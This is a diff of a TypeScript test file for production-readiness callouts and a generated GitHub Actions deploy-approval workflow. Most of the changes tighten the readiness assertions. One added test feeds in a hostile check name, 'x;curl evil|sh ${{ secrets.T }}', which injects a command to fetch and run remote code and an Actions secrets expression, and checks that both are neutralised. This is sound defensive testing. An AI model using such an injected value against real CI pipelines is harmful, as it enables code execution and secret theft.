@@ -69,20 +69,27 @@ it('productionCallouts words Off, Not ready, Almost ready and Ready', () => {
   expect(almost).toMatchObject([{ tone: 'warn', lead: 'Almost ready' }])
   expect(almost[0]!.text).toContain('deploy-production has not reported on recent commits')
   expect(callout({ checks: ['deploy-production'], seen: ['lint', 'deploy-production'] })).toMatchObject([{ tone: 'ok', lead: 'Ready' }])
-  expect(callout({ checks: ['a', 'b'], seen: ['b'] })[0]).toMatchObject({ lead: 'Ready' })
+  const partial = callout({ checks: ['a', 'b'], seen: ['b'] })
+  expect(partial[0]).toMatchObject({ lead: 'Almost ready' })
+  expect(partial[0]!.text).toContain('a has not reported')
 })
 
 it('productionCallouts calls a check ready when the forge cannot be read, and warns when nobody can be notified', () => {
-  expect(callout({ checks: ['deploy-production'], seen: null })).toMatchObject([{ lead: 'Ready' }])
+  expect(callout({ checks: ['deploy-production'], seen: null })).toMatchObject([{ lead: 'Ready', text: expect.stringContaining('not confirmed') }])
   expect(callout({ checks: ['deploy-production'], seen: null, notifiable: false }).map((c) => c.lead)).toEqual(['Ready', 'No approver'])
   expect(callout({ on: false, notifiable: false }).map((c) => c.lead)).toEqual(['Off'])
 })
 
 it('productionWorkflow reports the picked check on the Ticket merge commit', () => {
-  const yaml = productionWorkflow('deploy-production')
+  const yaml = productionWorkflow(['deploy-production', 'notify-prod'])
   expect(yaml).toContain("github.event.label.name == 'bauherr:approved:production'")
-  expect(yaml).toContain('name=deploy-production')
-  expect(yaml).toContain('head_sha=')
+  expect(yaml).toContain('        deploy-production\n        notify-prod\n')
+  expect(yaml).toContain('head_sha="$SHA"')
+  expect(yaml).toContain('--limit 200')
+  // a hostile check name stays data: no shell command, no Actions expression
+  const hostile = productionWorkflow(['x;curl evil|sh ${{ secrets.T }}'])
+  expect(hostile).not.toContain('${{ secrets.T }}')
+  expect(hostile).not.toMatch(/-f name=x/)
 })
 
 const ok = (name: string, id?: number) => ({ name, status: 'completed', conclusion: 'success', id })
